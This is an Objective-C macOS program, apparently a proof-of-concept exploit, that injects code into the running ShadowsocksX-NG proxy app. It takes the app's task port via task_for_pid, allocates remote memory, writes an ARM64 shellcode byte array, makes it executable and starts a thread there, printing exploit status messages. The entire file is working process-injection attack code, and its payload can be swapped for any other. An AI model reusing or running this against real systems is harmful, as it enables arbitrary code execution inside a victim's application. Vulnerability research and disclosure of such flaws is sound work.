#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>

#define STACK_SIZE 65536
#define CODE_SIZE 112

extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

char shellCode[] = "\x20\x00\x80\xd2\x64\xae\x8c\xd2\x84\xad\xad\xf2\x24\x4c\xc1\xf2\xe4\x83\x1f\xf8\x05\x01\x80\xd2\xe1\x63\x25\xcb\xc2\x00\x80\xd2\x90\x00\x80\xd2\x01\x10\x00\xd4\xc0\x00\x80\xd2\x30\x00\x80\xd2\xe1\xff\x1f\xd4\x01\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x02\x00\x00\x00\x80\x3f\x00\x00\x34\x00\x00\x00\x34\x00\x00\x00\xb5\x3f\x00\x00\x00\x00\x00\x00\x34\x00\x00\x00\x03\x00\x00\x00\x0c\x00\x01\x00\x10\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";

pid_t getShadowPID() {
    NSString * appPID = @"com.qiuyuzhou.ShadowsocksX-NG";
    NSArray<NSRunningApplication *> *runningShadowsocks = [NSRunningApplication runningApplicationsWithBundleIdentifier:appPID];
    
    if (runningShadowsocks == nil || [runningShadowsocks count] == 0) {
        printf("[!] Exploit failed!\n");
        exit(-1);
    }
    
    NSRunningApplication *ShadowsocksX_NG = runningShadowsocks[0];
    pid_t shadowPID = [ShadowsocksX_NG processIdentifier];
    
    return shadowPID;
}

int main(int argc, const char * argv[]) {
    pid_t shadowPID = getShadowPID();
    
    task_t remoteTask;
    kern_return_t kr = task_for_pid(current_task(), shadowPID, &remoteTask);
    
    if (kr != KERN_SUCCESS) {
        printf("[!] Failed to get ShadowsocksX-NG's task: %s\n", mach_error_string(kr));
        exit(-2);
    } else {
        printf("[+] ShadowsocksX-NG's task successfully taken over: %d\n", remoteTask);
    }

    mach_vm_address_t remoteStack = (vm_address_t)NULL;
    mach_vm_address_t remoteCode = (vm_address_t)NULL;

    kr = mach_vm_allocate(remoteTask, &remoteStack, STACK_SIZE, VM_FLAGS_ANYWHERE);

    if (kr != KERN_SUCCESS) {
        printf("Failed to allocate stack memory: %s\n", mach_error_string(kr));
    } else {
        printf("allocated stack at: 0x%llx\n", remoteStack);
    }

    kr = mach_vm_allocate(remoteTask, &remoteCode, CODE_SIZE, VM_FLAGS_ANYWHERE);

    if (kr != KERN_SUCCESS) {
        printf("Failed to allocate stack memory: %s\n", mach_error_string(kr));
    } else {
        printf("allocated code at: 0x%llx\n", remoteCode);
    }

    kr = mach_vm_write(remoteTask, remoteCode, (vm_address_t)shellCode,CODE_SIZE);

    if (kr != KERN_SUCCESS) {
        printf("Failed to write code: %s\n", mach_error_string(kr));
    } else {
        printf("written code at: 0x%llx\n", remoteCode);
    }

    kr  = vm_protect(remoteTask, remoteCode, CODE_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    remoteStack += (STACK_SIZE / 2);

    task_flavor_t flavor = ARM_THREAD_STATE64;
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;

    arm_thread_state64_t state;

    state.__pc = (uintptr_t)remoteCode;
    state.__sp = (uintptr_t)remoteStack;

    thread_act_t thread;
    kr = thread_create_running(remoteTask, flavor, (thread_state_t)&state, count, &thread);

    if (kr != KERN_SUCCESS) {
        printf("error spawning thread: %s\n", mach_error_string(kr));
    } else {
        printf("done\n");
    }

    return 0;
}
